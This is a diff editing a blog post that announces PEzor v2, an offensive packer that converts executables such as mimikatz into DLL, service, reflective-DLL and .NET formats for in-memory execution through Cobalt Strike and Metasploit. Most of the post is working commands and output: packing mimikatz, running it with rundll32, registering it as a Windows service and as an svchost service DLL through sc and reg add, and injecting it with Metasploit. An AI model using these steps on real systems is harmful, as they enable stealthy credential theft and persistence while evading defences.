@@ -4,24 +4,24 @@ layout: default
 
 _**Oct 26, 2020**_
 
-# Announcing PEzor v2 — New Output Formats and Cobalt Strike Integration
+# PEzor v2 — New Output Formats and Cobalt Strike Integration
 
-The `execute-assembly` capability of [Cobalt Strike](https://www.cobaltstrike.com/)'s beacon lets operators execute .NET assemblies without touching the disk and it's deeply influencing the recent offensive developments by pushing the community to move towards .NET and C#. But wouldn't be nice if we could [execute arbitary executables](https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html) with the same ease? Let's find out how we can achieve that with [PEzor](https://iwantmore.pizza/posts/PEzor.html)!
+The `execute-assembly` capability of [Cobalt Strike](https://www.cobaltstrike.com/)'s beacon lets operators execute .NET assemblies without touching the disk and it deeply influenced the recent offensive developments by pushing the community to move towards .NET. But wouldn't be nice if we could [execute arbitary executables](https://iwantmore.pizza/posts/meterpreter-shellcode-inject.html) with the same ease? Let's find out how we can achieve that with [PEzor](https://iwantmore.pizza/posts/PEzor.html)!
 
 ![PEzor with Cobalt Strike](../assets/images/pezor-cobaltstrike.jpg "PEzor with Cobalt Strike")
 
-## The Idea
+## Current State
 
 [Cobalt Strike](https://www.cobaltstrike.com/) supports two techniques to execute in-memory post-ex capabilities:
 
-1. [bdllspawn](https://www.cobaltstrike.com/aggressor-script/functions.html#bdllspawn): this function orders the beacon implant to retrieve a [reflective DLL](https://www.exploit-db.com/docs/english/13007-reflective-dll-injection.pdf) from the C2 server, create a sacrificial process, inject the payload in its memory and creating a thread to execute the exported function `ReflectiveLoader`, responsible of manually mapping the foreign DLL into target process without requiring the OS loader. In order to produce a reflective DLL from a regular one, we need to update its source code to integrate [Stephen Fewer's library](https://github.com/stephenfewer/ReflectiveDLLInjection) and compile it.
+1. [bdllspawn](https://www.cobaltstrike.com/aggressor-script/functions.html#bdllspawn): this function orders the beacon implant to retrieve a [reflective DLL](https://www.exploit-db.com/docs/english/13007-reflective-dll-injection.pdf) from the C2 server, create a sacrificial process, inject the payload in its memory and create a thread to execute the exported function `ReflectiveLoader`, responsible of manually mapping the foreign DLL into target process without requiring the OS loader. In order to produce a reflective DLL from a regular one, we need to update its source code to integrate [Stephen Fewer's library](https://github.com/stephenfewer/ReflectiveDLLInjection) and compile it.
 2. [bexecute_assembly](https://www.cobaltstrike.com/aggressor-script/functions.html#bexecute_assembly): this function orders the beacon implant to retrieve a .NET assembly from the C2 server, create a sacrificial process, inject a CLR hosting reflective DLL that will bootstrap the .NET runtime and pass the provided assembly to it. This technique doesn't require modification to the original source code since it can execute .NET PEs out of the box and for this reason it has been quite popular. However, we are limited to execute .NET assembly, so any native binary is a no-go if we don't want to touch the disk.
 
-After some research, I had the idea to improve [PEzor](https://iwantmore.pizza/posts/PEzor.html) in order to be able to produce different output formats than regular PE executables: if we can automate the process of converting an existing EXE/DLL/etc to other formats such as DLLs, reflective DLLs and .NET assemblies while maintaining the original semantic intact, we could implement a new command in [Cobalt Strike](https://www.cobaltstrike.com/) that can convert on the fly arbitrary executables and task the beacon to execute it in-memory.
+After some research, I thought I could improve [PEzor](https://iwantmore.pizza/posts/PEzor.html) in order to be able to produce different output formats than regular PE executables: if we can automate the process of converting an existing EXE/DLL/etc to other formats such as DLLs, reflective DLLs and .NET assemblies while maintaining the original semantic intact, we could implement a new command in [Cobalt Strike](https://www.cobaltstrike.com/) that can convert on the fly arbitrary executables and task the beacon to execute it in-memory.
 
 ## New Output Formats
 
-Currently, PEzor supports the following output formats, given an arbitrary executable or raw shellcode:
+Currently, PEzor supports the following new output formats, given an arbitrary executable or raw shellcode:
 
 - **exe**: this is the only format that was supported by PEzor v1, that is a native binary
 - **dll**: PEzor can now convert existing executables to their DLL counterpart, without requiring to recompile from the sources
@@ -35,6 +35,7 @@ Currently, PEzor supports the following output formats, given an arbitrary execu
 Let's see how we can generate and execute the new formats.
 
 - **exe**
+
 ```
 # generate
 $ PEzor -format=exe mimikatz.exe -z 2 -p '"token::whoami" "exit"'
@@ -44,6 +45,7 @@ C:> .\mimikatz.exe.packed.exe
 ```
 
 - **dll**
+
 ```
 # generate
 $ PEzor -format=dll mimikatz.exe -z 2 -p '"token::whoami" "exit"'
@@ -52,7 +54,8 @@ $ PEzor -format=dll mimikatz.exe -z 2 -p '"token::whoami" "exit"'
 C:> rundll32 .\mimikatz.exe.packed.dll,DllMain
 ```
 
-- **service-exe**  
+- **service-exe**
+
 ```
 # generate
 $ PEzor -format=service-exe mimikatz.exe -z 2 -p '"log C:/Users/Public/mimi.out" "coffee" "exit"'
@@ -75,6 +78,7 @@ SERVICE_NAME       : mimiservice
 ```
 
 - **service-dll**
+
 ```
 # generate
 $ PEzor -format=service-dll mimikatz.exe -z 2 -p '"log C:/Users/Public/mimi.out" "coffee" "exit"'
@@ -85,6 +89,9 @@ C:\Users\Public> copy /y mimikatz.packed.exe.service.dll %SystemRoot%\System32\S
 
 C:\Users\Public> sc create SvcHostDemo binpath= ^%SystemRoot^%"\System32\svchost -k mygroup" type= share start= demand
 [SC] CreateService SUCCESS
+
+C:\Users\Public> reg add "HKLM\SYSTEM\CurrentControlSet\services\SvcHostDemo\Parameters /v ServiceDll /t REG_EXPAND_SZ /d ^%SystemRoot^%\System32\SvcHostDemo.dll /f
+The operation completed successfully.
 
 C:\Users\Public> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost" /v mygroup /t REG_MULTI_SZ /d SvcHostDemo /f
 The operation completed successfully.
@@ -103,9 +110,10 @@ SERVICE_NAME       : SvcHostDemo
 ```
 
 - **reflective-dll**
+
 ```
 # generate
-$ PEzor -format=reflective-dll mimikatz.exe -z 2 -p '"coffee" "exit"'
+$ PEzor -format=reflective-dll mimikatz.exe -z 2 -p '"log mimi.out" "coffee" "exit"'
 
 # execute
 msf5 > use post/windows/manage/reflective_dll_inject
@@ -113,6 +121,8 @@ msf5 post(windows/manage/reflective_dll_inject) > set PATH mimikatz.exe.packed.r
 msf5 post(windows/manage/reflective_dll_inject) > set WAIT 10
 msf5 post(windows/manage/reflective_dll_inject) > run
 ```
+
+![PEzor with Metasploit](../assets/images/pezor-metasploit.jpg "PEzor with Metasploit")
 
 ## Cobalt Strike Integration
 
